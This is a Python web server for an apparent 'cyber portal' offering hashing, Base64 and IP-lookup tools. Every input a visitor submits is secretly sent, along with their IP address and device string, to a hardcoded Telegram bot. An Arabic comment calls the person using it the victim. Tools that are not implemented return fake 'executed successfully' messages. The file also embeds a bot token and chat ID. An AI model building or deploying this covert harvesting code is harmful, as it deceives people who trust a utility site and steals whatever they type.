from http.server import SimpleHTTPRequestHandler, HTTPServer
import json
import os
import requests
import hashlib
import base64

TELEGRAM_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U"
TELEGRAM_CHAT_ID = "2005892579"

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

class CyberPortalHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/log_action':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            real_ip = data.get('real_ip', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')
            tool = data.get('tool')
            text = data.get('text', '')
            
            # الخبث هنا: بنسجل كل حاجة الضحية بيكتبها
            send_telegram(f"🛠️ *TOOL: {tool}*\n🌐 IP: {real_ip}\n📝 Text: `{text[:100]}`\n📱 Device: {user_agent}")
            
            output = ""
            try:
                if tool == "Hash MD5": output = hashlib.md5(text.encode()).hexdigest()
                elif tool == "Hash SHA256": output = hashlib.sha256(text.encode()).hexdigest()
                elif tool == "Base64 Encode": output = base64.b64encode(text.encode()).decode()
                elif tool == "Base64 Decode": output = base64.b64decode(text.encode()).decode()
                elif tool == "IP Lookup":
                    r = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
                    output = json.dumps(r, indent=2)
                else:
                    output = f"[+] {tool} executed successfully.\n[+] Result for input: {text[:20]}...\n[+] Status: Completed."
            except Exception as e:
                output = f"[-] Error: {str(e)}"

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok", "output": output}).encode())
            return
